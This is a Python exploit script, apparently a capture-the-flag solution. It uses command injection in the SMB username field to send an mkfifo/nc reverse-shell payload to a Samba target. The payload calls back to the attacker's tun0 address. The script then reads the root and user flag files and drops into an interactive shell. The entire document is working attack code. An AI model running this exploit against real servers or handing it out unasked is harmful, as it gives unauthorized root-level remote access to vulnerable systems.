#!/usr/bin/env python3

from pwn import *
import argparse
import netifaces as ni
from time import sleep
from smb.SMBConnection import SMBConnection

warnings.filterwarnings("ignore", category=UserWarning, module="pwntools")

ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']


def exploit(RHOST, RPORT):
    listener = listen(0)    # listen on a random port
    port = listener.lport
    
    # Preparing the payload to connect
    payload = 'mkfifo /tmp/hago; nc ' + ip + ' ' + str(port) + ' 0</tmp/hago | /bin/sh >/tmp/hago 2>&1; rm /tmp/hago'
    username = "/=`nohup " + payload + "`"
    conn = SMBConnection(username, "","","")
    try:
        conn.connect(RHOST, int(RPORT), timeout=1)  ## Connecting to SMB with the payload
    except:
        print("[+] Payload was sent!")
    shell = listener.wait_for_connection()      ## Waiting for the connection back
    log.info("We got the shell!")
    # shell.interactive()
    print("\nROOT PROOF:\n")
    shell.sendline("cat /root/root.txt && pwd && id && hostname && ip addr".encode())   ## Getting the root proof
    print("Sending the command 'cat /root/root.txt && pwd && id && hostname && ip addr'\n")
    sleep(2)
    print(shell.recv(1024).decode())
    print("\nUSER PROOF:\n")
    print("Sending the command 'cat /home/makis/user.txt && pwd && id && hostname && ip addr'\n")   ## Getting the user proof
    shell.sendline("cat /home/makis/user.txt && pwd && id && hostname && ip addr".encode())
    sleep(2)
    print(shell.recv(1024).decode())


    shell.sendline("SHELL=/bin/bash script -q /dev/null".encode())
    shell.interactive()             ## Getting the Ineteractive shell

def main():
    parser = parser = argparse.ArgumentParser()
    parser.add_argument('-rht', '--rhost', required=True, help="Enter the ip address of RHOST")
    parser.add_argument('-p', '--port', required=True, help="Enter the RPORT")
    argv = parser.parse_args()
    RHOST = argv.rhost
    RHOST = RHOST.strip()
    RPORT = argv.port
    RPORT = RPORT.strip()
    exploit(RHOST, RPORT)

if __name__ == "__main__":
    main()